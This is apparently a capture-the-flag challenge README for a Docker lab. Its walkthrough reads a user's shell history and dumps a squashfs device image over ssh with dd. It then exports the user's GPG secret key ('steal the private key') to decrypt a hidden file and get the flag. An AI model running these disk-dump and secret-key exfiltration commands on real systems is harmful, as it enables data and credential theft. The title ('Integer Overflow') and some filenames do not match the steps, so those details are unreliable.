# Sudo - Integer Overflow

## Setup

1. Build and add the pseudo-device - will add loop device /dev/loop2 (/dev/loop0 and loop1 are reserved for docker)
```bash
$ make build
# add /dev/loop2 device
$ sudo make deploy
```

2. Build the docker image
```bash
$ docker-compose build
```

3. Run the image
```bash
$ docker-compose up
```

4. Connect to user 'jfobb' password 'ctf'
```bash
$ ssh jfobb@localhost -p 5000
```

5. To clean up:
```bash
$ make clean
# remove loop device
$ sudo make unstage
```

## Solution

1. Observe present files in user dir

```bash
$ ls
media
```

2. See if anything is present in media:

```bash
$ ls media/
```

3. Nothing. Try all home files

```bash
$ ls -a
. .. .bash_history .bash_logout .bashrc .gnupg .profile media
```

4. Some things to notice: .gnupg, .bash_history are present. Run history to see what has happened in the past:

```bash
$ history
1  ls
2  ls -a
3  cp important ~/media/Documents/jfobb
4  umount ~/media
5  rm important
6  exit
...
```

5. There was a fishy "important" file, but its gone now. The user previously mounted something, so lets check out /dev: (note: this is machine-specific, results may vary.)

```bash
$ ls /dev -l
total 0
lrwxrwxrwx 1 root root   11 Feb 21 00:40 core -> /proc/kcore
lrwxrwxrwx 1 root root   13 Feb 21 00:40 fd -> /proc/self/fd
crw-rw-rw- 1 root root 1, 7 Feb 21 00:40 full
drwxrwxrwt 2 root root   40 Feb 21 00:40 mqueue
crw-rw-rw- 1 root root 1, 3 Feb 21 00:40 null
lrwxrwxrwx 1 root root    8 Feb 21 00:40 ptmx -> pts/ptmx
drwxr-xr-x 2 root root    0 Feb 21 00:40 pts
crw-rw-rw- 1 root root 1, 8 Feb 21 00:40 random
br-xr-xr-x 1 root  994 7, 2 Feb 21 00:40 sda1
drwxrwxrwt 2 root root   40 Feb 21 00:40 shm
lrwxrwxrwx 1 root root   15 Feb 21 00:40 stderr -> /proc/self/fd/2
lrwxrwxrwx 1 root root   15 Feb 21 00:40 stdin -> /proc/self/fd/0
lrwxrwxrwx 1 root root   15 Feb 21 00:40 stdout -> /proc/self/fd/1
crw-rw-rw- 1 root root 5, 0 Feb 21 00:40 tty
crw-rw-rw- 1 root root 1, 9 Feb 21 00:40 urandom
crw-rw-rw- 1 root root 1, 5 Feb 21 00:40 zero
```

6. No matter what the output is, notice the presence of "/dev/sda1"! Let's see if we can get any info off hand:

```bash
$ cat /dev/sda1
hsqs
    &O^�@�V�V���������U#V�V�Vxڤ�	TSW�6|2�@&�<	aI�)H0�`A�(
j�A�'
H���'a1
...
P
���V#x�K`�T��|F(J�r@�0s���������V
```

7. Doesn't look usable. Maybe mount at ~/media again?

```bash
$ mount /dev/sda1 ~/media
mount: only root can do that
```

8. We don't have write permissions, and even if we did we don't have root permissions. But, we do have a few tricks we can do to get this to work. First, lets find out what file system this is:

```bash
$ blkid /dev/sda1
/dev/sda1: TYPE="squashfs"
```

9. squashfs. Not a very common file system anymore. After some Googling, one would know that squashfs-tools is required for dealing with squashfs. Let's try using them on jfobb's account:
```bash
$ unsquashfs
-bash: unsquashfs: command not found
```

10. Looks like squashfs-tools are not installed, So we will have to deal with this image locally. Let's log out first:
```bash
$ exit
```

11. We can use dd to get the image locally through standard out:
```bash
$ ssh jfobb@localhost -p 5000 "dd if=/dev/sda1" | dd of=new_img.img
```

12. The image is now on our local machine! Now, let's mount it (I use /mnt but you can choose wherever):
```bash
$ mount -o loop -t squashfs read_data.img /mnt
```

13. Lets check out the directory!
```bash
$ cd /mnt
$ tree
.
├── benny.gif
└── Documents
    ├── jfobb
    │   └── important
    └── other
```

14. Ignoring benny.gif, we can finally see this mysterious 'important' file. Let's finally read it.
```bash
$ cat /mnt/Documents/jfobb/important
-----BEGIN PGP MESSAGE-----
...
-----END PGP MESSAGE-----
```

15. Darn, it is encrypted. But, remember that we had a .gnnupg directory. Logging back on to the server, we can list our keys.
```bash
$ gpg --list-secret-keys
/home/jfobb/.gnupg/pubring.kbx
------------------------------
sec   rsa2048 2020-02-20 [SC]
      372C877C5FB37069A00972F00DE28E1AE87B1C08
uid           [ unknown] J Fobb <jfobb@email.com>
ssb   rsa2048 2020-02-20 [E]
```

16. Lets steal the private key for ourselves, and import.

```bash
$ ssh jfobb@localhost -p 5000 "gpg --export-secret-keys jfobb@email.com" > priv.key
$ gpg --import priv.key
```

17. Now, we can read this encrypted file.

```bash
$ gpg --output important_file --decrypt important
$ cat important_file
PK
�aTPdocs/UT	��N^��N^ux
                          ��PK
...
```

18. Still not very readable. Let's see if we can understand its filetype:

```bash
$ file important_file
important_file: gzip compressed data, from Unix, original size modulo 2^32 10240
```

19. Interesting, it is a tar.gz file! Lets extract it.

```bash
$ tar -xf important_file
```

Or if it helps,

```bash
$ mv important_file important_file.tar.gz
$ tar -xvf important_file.tar.gz
docs/
docs/flag
```

20. There's the flag, let us finally read it.
```
cat docs/flag
```
